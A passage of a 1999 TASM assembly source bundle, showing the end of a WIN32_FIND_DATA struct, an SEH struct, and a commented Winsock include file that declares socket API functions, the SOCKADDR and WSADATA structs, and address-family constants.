fd_ftCreationTime	DWORD	  0, 0		;time of file creation
fd_ftLastAccessTime	DWORD	  0, 0		;time of last file access
fd_ftLastWriteTime	DWORD	  0, 0		;time of last write access
fd_nFileSizeHigh	DWORD	  0		;high-order word of file size
fd_nFileSizeLow		DWORD	  0		;low-order word of file size
fd_dwReserved0		DWORD	  0		;(reserved)
fd_dwReserved1		DWORD	  0		;(reserved)
fd_cFileName		CHAR	  260 dup(0)    ;matching file name
fd_cAlternateFileName	CHAR	  14 dup(0)	;8.3 alias name
WIN32_FIND_DATA		ends
;


SEH struct
m_pSEH	   		DWORD 0
m_pExcFunction    	DWORD 0
SEH ends
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[MYINC.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[WSOCKS.INC]컴�
;
;      WSocks.inc: include file for windows sockets .
;      Designed for TASM5 and Win32.
;
;      (C) 1999 Bumblebee.
;
;       This file contains basic structures and stuff to work
;       with windows sockets.
;

; Descriptions of the API:
;  arguments in order of PUSH ;)

; only for debug
extrn   WSAGetLastError:PROC

; starts the use of winsock dll
; addr WSADATA, version requested
; returns: 0 ok
extrn	WSAStartup:PROC

; terminates the use of winsock dll
; returns: SOCK_ERR on error
extrn	WSACleanup:PROC

; opens a new socket
; protocol (PCL_NONE), type (SOCK_??), addr format (AF_??)
; returns: socket id or SOCKET_ERR (socket is dw)
extrn	socket:PROC

; closes a socket
; socket descriptor
;
extrn   closesocket:PROC

; sends data (this socks are a shit... Unix uses simple write)
; flags (1  OOB data or 0 normal ) , length, addr of buffer, socket
; returns: caracters sent or SOCKET_ERR on error
extrn   send:PROC

; reveives data (this socks are a shit... Unix uses simple read)
; flags (use 0), length, addr of buffer, socket
; returns: caracters sent or SOCKET_ERR on error
extrn   recv:PROC

; connects to a server
; sizeof struct SOCKADDR, struct SOCKADDR, socket
; returns: SOCKET_ERR on error
extrn	connect:PROC

; gets the name of the current host
; length of the buffer for name, addr of buffer for name
; return: SOCKET_ERR on error
extrn   gethostname:PROC

; gets strcut hostent
; addr of name
; returns: ponter to the struct or 0 on error
extrn   gethostbyname:PROC

; converts a zstring like "xxx.xxx.xx...." to netw byte order
; zstring ptr to change to dotted addr format
; returns: in_addr (dd)
extrn 	inet_addr:PROC

; dw to convert into netw byte order (usually the port)
; returns: the value in network byte order (dw)
extrn   htons:PROC

; Structs :o

; sockaddr struct for connection
; modified (for better use)
; if you want the original look for it into a winsock.h
SOCKADDR        struct
sin_family	dw	0	; ex. AF_INET
sin_port	dw	0	; use htons for this
sin_addr        dd      0       ; here goes server node (from inet_addr)
sin_zero	db	8 dup(0)
SOCKADDR        ends

; for WSAStartup diagnose
WSADATA		struct
mVersion	dw	0
mHighVersion	dw	0
szDescription	db	257 dup(0)
szSystemStatus	db	129 dup(0)
iMaxSockets	dw	0
iMaxUpdDg	dw	0
lpVendorInfo	dd	0
WSADATA		ends

; Some nice equs 

; what version of winsock do you need? (usually 1.1)
VERSION1_0      equ     0100h
VERSION1_1      equ     0101h
VERSION2_0      equ     0200h

AF_UNIX		equ	1	; local host
AF_INET         equ     2       ; internet (most used)
AF_IMPLINK	equ	3	; arpanet
AF_NETBIOS	equ	17	; NetBios style addresses

; types of sockets
SOCK_STREAM     equ     1       ; stream (connection oriented; telnet like)
SOCK_DGRAM      equ     2       ; datagram (packets, packets, packets)

; protocol
PCL_NONE        equ     0       ; none (define the protocol not needed)

SOCKET_ERR      equ     -1      ; standard winsock error

HOSTENT_IP      equ     10h     ; where is the IP into the hostent struct
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[WSOCKS.INC]컴�
